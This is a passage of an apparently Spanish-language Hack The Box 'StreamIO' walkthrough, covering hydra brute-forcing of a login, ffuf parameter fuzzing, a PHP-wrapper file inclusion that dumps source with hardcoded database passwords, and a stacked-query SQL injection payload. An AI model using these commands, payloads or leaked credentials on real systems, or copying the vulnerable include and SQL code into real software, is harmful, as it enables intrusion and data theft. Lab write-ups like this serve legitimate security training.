66boysandgirls.. 665a50ac9eaa781e4f7f04199db97a11: paddpadd cce4dc8008d7cf2c8aef5a7c82ac6e8d: gato123 d41b81798500b204e9800998ecf8427e: -- d41d8cd98f003004e9800998ecf8427e: -- Intentamos enumerar la base de datos \u0026lsquo;streamio_backup\u0026rsquo; pero no es posible obtener información.\nOut-of-Band Durante la explotación de la vulnerabilidad SQLi identificamos que es posible realizar out-of-band utilizando xp_dirtree, sin embargo el hash obtenido no es posible crackearlo con el wordlist rockyou.txt.\nWebsite - admin Con la información encontrada logramos crear dos wordlists con nombres de usuarios y contraseñas.\nwordlists\r1 2 3 4 5 6 7 8 9 10 11 12 13 L3m0n@de ##123a8j8w5123## !!sabrina$ highschoolmusical $hadoW !?Love?!123 !5psycho8! %$clara $3xybitch $monique$1991$ 66boysandgirls.. paddpadd gato123 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 James Theodore Samantha Lauren Wildiam Sabrina Robert Thane Carmon Barry Oliver Michelle Gloria Victoria Alexendra Baxter Clara Barbra Lenord Austin Garfield Juliette Victor Lucifer Bruno Diablo Robin Stan yoshihide admin gato Login - Brute Force Utilizamos los wordlist con hydra en el login del dominio, vemos que existen dos combinaciones válidas.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/streamio ❯ hydra -L users.txt -P pass.txt streamio.htb https-post-form \u0026#34;/login.php:username=^USER^\u0026amp;password=^PASS^:Login failed\u0026#34; Hydra v9.2 (c) 2021 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-05 06:20:38 [DATA] max 16 tasks per 1 server, overall 16 tasks, 403 login tries (l:31/p:13), ~26 tries per task [DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^\u0026amp;password=^PASS^:Login failed [443][http-post-form] host: streamio.htb login: yoshihide password: 66boysandgirls.. [443][http-post-form] host: streamio.htb login: gato password: $monique$1991$ 1 of 1 target successfully completed, 2 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-05 06:21:00 π ~/htb/streamio ❯ Admin Panel Al ingresar nos redirige al index de la página y no muestra contenido diferente. Si recordamos existe una dirección /admin/, tras visitar esta dirección se muestra un panel con distintas opciones. En \u0026lsquo;User management\u0026rsquo; se muestra al usuario admin con el boton de eliminar.\n\u0026lsquo;Staff management\u0026rsquo; muestra la lista de usuarios que ya encontramos anteriormente con la opcion de eliminar, aunque al realizar clic sobre esta se muestra una alerta.\n\u0026lsquo;Staff management\u0026rsquo; lista peliculas, en esta es posible eliminar cada una de estas.\nFinalmente \u0026lsquo;Leave a message for admin\u0026rsquo; no muestra ningun contenido.\nNavegando por las distintas opciones vemos que muestra un \u0026ldquo;parametro\u0026rdquo; en cada una de las páginas. Sin embargo ninguno de estos acepta algun valor numérico o string/letras.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;ul class=\u0026#34;nav nav-pills nav-fill\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;?user=\u0026#34;\u0026gt;User management\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;?staff=\u0026#34;\u0026gt;Staff management\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;?movie=\u0026#34;\u0026gt;Movie management\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;?message=\u0026#34;\u0026gt;Leave a message for admin\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; User - Yoshihide Fuzzing - Parameter Realizamos fuzzing para encontrar nuevos parametros con ffuf junto con el wordlist burp-parameter-names, agregando un filtro de tamaño (-fs 1678). Observamos un parametro nuevo y tres ya conocidos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~/htb/streamio ❯ ffuf -c -w burp-parameter-names.txt -H \u0026#34;Cookie: PHPSESSID=mi8u22limuo3p9jfnan1itenfm\u0026#34; -u \u0026#34;https://streamio.htb/admin/?FUZZ=fuzzorelse\u0026#34; -fs 1678 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : https://streamio.htb/admin/?FUZZ=fuzzorelse :: Wordlist : FUZZ: burp-parameter-names.txt :: Header : Cookie: PHPSESSID=mi8u22limuo3p9jfnan1itenfm :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 1678 ________________________________________________ debug [Status: 200, Size: 1712, Words: 90, Lines: 50] movie [Status: 200, Size: 320235, Words: 15986, Lines: 10791] staff [Status: 200, Size: 12484, Words: 1784, Lines: 399] user [Status: 200, Size: 2073, Words: 146, Lines: 63] :: Progress: [6453/6453] :: Job [1/1] :: 331 req/sec :: Duration: [0:00:25] :: Errors: 0 :: π ~/htb/streamio ❯ Observamos que al pasar el parametro debug muestra un mensaje.\nNuevamente utilizamos ffuf esta vez para ver que tipo de valor es el que acepta este parametro, esta vez utilizamos el wordlist common. En el resultado se muestra index.php como encontrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/streamio ❯ ffuf -c -w $CM -H \u0026#34;Cookie: PHPSESSID=mi8u22limuo3p9jfnan1itenfm\u0026#34; -u \u0026#34;https://streamio.htb/admin/?debug=FUZZ\u0026#34; -fs 1712 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : https://streamio.htb/admin/?debug=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Header : Cookie: PHPSESSID=mi8u22limuo3p9jfnan1itenfm :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 1712 ________________________________________________ index.php [Status: 200, Size: 1693, Words: 93, Lines: 47] :: Progress: [4614/4614] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:17] :: Errors: 0 :: π ~/htb/streamio ❯ Tras pasarle este valor vemos que muestra un error, pero segun parece acepta valores con php.\nEjecutamos nuevamente ffuf, esta vez con la extensión php, encontramos el nombre master. Al pasar este valor se muestra la página que observamos con el parametro movie.\nExpand me\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 π ~/htb/streamio ❯ ffuf -c -w $CM -H \u0026#34;Cookie: PHPSESSID=mi8u22limuo3p9jfnan1itenfm\u0026#34; -u \u0026#34;https://streamio.htb/admin/?debug=FUZZ.php\u0026#34; -fs 1712 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : https://streamio.htb/admin/?debug=FUZZ.php :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Header : Cookie: PHPSESSID=mi8u22limuo3p9jfnan1itenfm :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 1712 ________________________________________________ index [Status: 200, Size: 1693, Words: 93, Lines: 47] Index [Status: 200, Size: 0, Words: 1, Lines: 1] master [Status: 200, Size: 341564, Words: 17698, Lines: 11123] :: Progress: [4614/4614] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:30] :: Errors: 0 :: π ~/htb/streamio ❯ De igual forma \u0026ldquo;subiendo\u0026rdquo; un directorio logramos visualizar la pagina contact.php.\nLFI - Source Code Utilizando un wrapper de php especificamente para convertir en base64 junto con el nombre de la pagina, en este caso index.php logramos obtener su codigo fuente. Observamos una conexion de base de datos con las credenciales. Además vemos que utiliza include en el parametro debug. Descubrimos paginas nuevas: user_inc.php, staff_inc.php, movie_inc.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php define(\u0026#39;included\u0026#39;,true); session_start(); if(!isset($_SESSION[\u0026#39;admin\u0026#39;])) { header(\u0026#39;HTTP/1.1 403 Forbidden\u0026#39;); die(\u0026#34;\u0026lt;h1\u0026gt;FORBIDDEN\u0026lt;/h1\u0026gt;\u0026#34;); } $connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34;, \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_admin\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hx31234567890\u0026#39;); $handle = sqlsrv_connect(\u0026#39;(local)\u0026#39;,$connection); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; [.. snip ..] \u0026lt;?php if(isset($_GET[\u0026#39;debug\u0026#39;])) { echo \u0026#39;this option is for developers only\u0026#39;; if($_GET[\u0026#39;debug\u0026#39;] === \u0026#34;index.php\u0026#34;) { die(\u0026#39; ---- ERROR ----\u0026#39;); } else { include $_GET[\u0026#39;debug\u0026#39;]; } } else if(isset($_GET[\u0026#39;user\u0026#39;])) require \u0026#39;user_inc.php\u0026#39;; else if(isset($_GET[\u0026#39;staff\u0026#39;])) require \u0026#39;staff_inc.php\u0026#39;; else if(isset($_GET[\u0026#39;movie\u0026#39;])) require \u0026#39;movie_inc.php\u0026#39;; else ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Logramos obtener el codigo fuente de estas tres páginas, se observan distintos queries para la tabla movie y users, estos queries toman un id para realizar la consulta, no se observa ningun tipo de filtro por lo que es posible agregar un query al final.\nuser_inc.php\rstaff_inc.php\rmovie_inc.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // user_inc.php \u0026lt;h1\u0026gt;User managment\u0026lt;/h1\u0026gt; \u0026lt;?php if(!defined(\u0026#39;included\u0026#39;)) die(\u0026#34;Only accessable through includes\u0026#34;); if(isset($_POST[\u0026#39;user_id\u0026#39;])){ $query = \u0026#34;delete from users where is_staff = 0 and id = \u0026#34;.$_POST[\u0026#39;user_id\u0026#39;]; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); } $query = \u0026#34;select * from users where is_staff = 0\u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) { ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;form-control\u0026#34; style=\u0026#34;height: 3rem;\u0026#34;\u0026gt; \u0026lt;h4 style=\u0026#34;float:left;\u0026#34;\u0026gt;\u0026lt;?php echo $row[\u0026#39;username\u0026#39;]; ?\u0026gt;\u0026lt;/h4\u0026gt; \u0026lt;div style=\u0026#34;float:right;padding-right: 25px;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;user_id\u0026#34; value=\u0026#34;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-sm btn-primary\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } # while end ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 //staff_inc.php \u0026lt;h1\u0026gt;Staff managment\u0026lt;/h1\u0026gt; \u0026lt;?php if(!defined(\u0026#39;included\u0026#39;)) die(\u0026#34;Only accessable through includes\u0026#34;); $query = \u0026#34;select * from users where is_staff = 1 \u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); if(isset($_POST[\u0026#39;staff_id\u0026#39;])){ ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt; Message sent to administrator\u0026lt;/div\u0026gt; \u0026lt;?php } $query = \u0026#34;select * from users where is_staff = 1\u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)){ ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;form-control\u0026#34; style=\u0026#34;height: 3rem;\u0026#34;\u0026gt; \u0026lt;h4 style=\u0026#34;float:left;\u0026#34;\u0026gt;\u0026lt;?php echo $row[\u0026#39;username\u0026#39;]; ?\u0026gt;\u0026lt;/h4\u0026gt; \u0026lt;div style=\u0026#34;float:right;padding-right: 25px;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;staff_id\u0026#34; value=\u0026#34;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-sm btn-primary\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } # while end ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //movie_inc.php \u0026lt;h1\u0026gt;Movie managment\u0026lt;/h1\u0026gt; \u0026lt;?php if(!defined(\u0026#39;included\u0026#39;)) die(\u0026#34;Only accessable through includes\u0026#34;); if(isset($_POST[\u0026#39;movie_id\u0026#39;])){ $query = \u0026#34;delete from movies where id = \u0026#34;.$_POST[\u0026#39;movie_id\u0026#39;]; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); } $query = \u0026#34;select * from movies order by movie\u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) { ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;form-control\u0026#34; style=\u0026#34;height: 3rem;\u0026#34;\u0026gt; \u0026lt;h4 style=\u0026#34;float:left;\u0026#34;\u0026gt;\u0026lt;?php echo $row[\u0026#39;movie\u0026#39;]; ?\u0026gt;\u0026lt;/h4\u0026gt; \u0026lt;div style=\u0026#34;float:right;padding-right: 25px;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;?movie=\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;movie_id\u0026#34; value=\u0026#34;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-sm btn-primary\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } # while end ?\u0026gt; Podemos agregar el query separado por punto y coma, este se ejecutaría, similar al sqli del login.\n1 movie_id=\u0026#39;1722\u0026#39;; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;; También logramos obtener el codigo fuente de register.php y login.php, observamos que existe una función para identificar ciertos caracteres para registro de un usuario, por otro lado el login unicamente acepta como válido al usuario yoshihide. Además observamos que existen dos credenciales para la conexion de base de datos, se observan los usuarios db_user y db_admin.\nregister.php\rlogin.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 //[.. snip ..] // register.php \u0026lt;?php function bad_char_check($name) { $bad_chars = array(\u0026#39;!\u0026#39;,\u0026#39;\u0026#34;\u0026#39;,\u0026#39;#\u0026#39;,\u0026#39;$\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;(\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;,\u0026#39;,\u0026#39;-\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;/\u0026#39;,\u0026#39;:\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;\u0026lt;\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;@\u0026#39;,\u0026#39;[\u0026#39;,\u0026#39;]\u0026#39;,\u0026#39;^\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;~\u0026#39;); foreach ($bad_chars as $chars) { if (strpos($name,$chars) !== false) { return false; } } return true; } if(isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;confirm\u0026#39;])) { # Register here ## param check ## password match check if($_POST[\u0026#39;password\u0026#39;] !== $_POST[\u0026#39;confirm\u0026#39;]) { ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt; Passwords do not match \u0026lt;/div\u0026gt; \u0026lt;?php } ## username check $user = $_POST[\u0026#39;username\u0026#39;]; $pass = md5($_POST[\u0026#39;password\u0026#39;]); if (!bad_char_check($user)) { ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Bad character detected, please avoid any bad characters while creating a User\u0026lt;/div\u0026gt; \u0026lt;?php } else { $connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34;, \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_admin\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hx31234567890\u0026#39;); $handle = sqlsrv_connect(\u0026#39;(local)\u0026#39;,$connection); $query = \u0026#34;insert into users(username,password,is_staff) values(\u0026#39;$user\u0026#39;,\u0026#39;$pass\u0026#39;,0)\u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt; Account created \u0026lt;/div\u0026gt; \u0026lt;?php } } ?\u0026gt; //[.. snip ..] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 //[.. snip ..] //login.php \u0026lt;?php $connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34; , \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_user\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hB1@hB1@h\u0026#39;); $handle = sqlsrv_connect(\u0026#39;(local)\u0026#39;,$connection); function bad_char_check($name) { $bad_chars = array(\u0026#39;!\u0026#39;,\u0026#39;\u0026#34;\u0026#39;,\u0026#39;#\u0026#39;,\u0026#39;$\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;(\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;,\u0026#39;,\u0026#39;-\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;/\u0026#39;,\u0026#39;:\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;\u0026lt;\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;@\u0026#39;,\u0026#39;[\u0026#39;,\u0026#39;]\u0026#39;,\u0026#39;^\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;~\u0026#39;); foreach ($bad_chars as $chars) { if (strpos($name,$chars) !== false) { return false; } } return true; } if(isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) { # login here ## Check from db here dbch $user = $_POST[\u0026#39;username\u0026#39;]; $pass = md5($_POST[\u0026#39;password\u0026#39;]); $query = \u0026#34;select * from users where username = \u0026#39;$user\u0026#39; and password = \u0026#39;$pass\u0026#39;\u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); if(sqlsrv_num_rows($res) == 1 \u0026amp;\u0026amp; $user === \u0026#39;yoshihide\u0026#39;) { # Login success $_SESSION[\u0026#39;logged_in\u0026#39;] = 1; # Admin success $_SESSION[\u0026#39;admin\u0026#39;] = 1; header(\u0026#34;Location: https://streamio.htb/\u0026#34;); } else { ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Login failed\u0026lt;/div\u0026gt; \u0026lt;?php } } ?\u0026gt; //[.. snip ..] 1 2 $connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34;, \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_admin\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hx31234567890\u0026#39;); $connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34; , \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_user\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hB1@hB1@h\u0026#39;); Finalmente tenemos al archivo master.php, tiene la mayor parte de codigo de las tres paginas anteriores, sin embargo vemos al final del archivo un formulario con funciones que son vulnerables.\nExpand me - master.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 \u0026lt;h1\u0026gt;Movie managment\u0026lt;/h1\u0026gt; \u0026lt;?php if(!defined(\u0026#39;included\u0026#39;)) die(\u0026#34;Only accessable through includes\u0026#34;); if(isset($_POST[\u0026#39;movie_id\u0026#39;])) { $query = \u0026#34;delete from movies where id = \u0026#34;.$_POST[\u0026#39;movie_id\u0026#39;]; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); } $query = \u0026#34;select * from movies order by movie\u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) { ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;form-control\u0026#34; style=\u0026#34;height: 3rem;\u0026#34;\u0026gt; \u0026lt;h4 style=\u0026#34;float:left;\u0026#34;\u0026gt;\u0026lt;?php echo $row[\u0026#39;movie\u0026#39;]; ?\u0026gt;\u0026lt;/h4\u0026gt; \u0026lt;div style=\u0026#34;float:right;padding-right: 25px;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;?movie=\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;movie_id\u0026#34; value=\u0026#34;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-sm btn-primary\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } # while end ?\u0026gt; \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h1\u0026gt;Staff managment\u0026lt;/h1\u0026gt; \u0026lt;?php if(!defined(\u0026#39;included\u0026#39;)) die(\u0026#34;Only accessable through includes\u0026#34;); $query = \u0026#34;select * from users where is_staff = 1 \u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); if(isset($_POST[\u0026#39;staff_id\u0026#39;])) { ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt; Message sent to administrator\u0026lt;/div\u0026gt; \u0026lt;?php } $query = \u0026#34;select * from users where is_staff = 1\u0026#34;; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) { ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;form-control\u0026#34; style=\u0026#34;height: 3rem;\u0026#34;\u0026gt; \u0026lt;h4 style=\u0026#34;float:left;\u0026#34;\u0026gt;\u0026lt;?php echo $row[\u0026#39;username\u0026#39;]; ?\u0026gt;\u0026lt;/h4\u0026gt; \u0026lt;div style=\u0026#34;float:right;padding-right: 25px;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;staff_id\u0026#34; value=\u0026#34;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-sm btn-primary\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } # while end ?\u0026gt; \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h1\u0026gt;User managment\u0026lt;/h1\u0026gt; \u0026lt;?php if(!defined(\u0026#39;included\u0026#39;)) die(\u0026#34;Only accessable through includes\u0026#34;); if(isset($_POST[\u0026#39;user_id\u0026#39;])) { $query = \u0026#34;delete from users where is_staff = 0 and id = \u0026#34;.$_POST[\u0026#39;user_id\u0026#39;]; $res = sqlsrv_query($handle, $query, array(), array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); } $query = \u0026#34;select * from users where is_staff = 0\u0026#34;; $res = sqlsrv_query($handle, $query, array(), 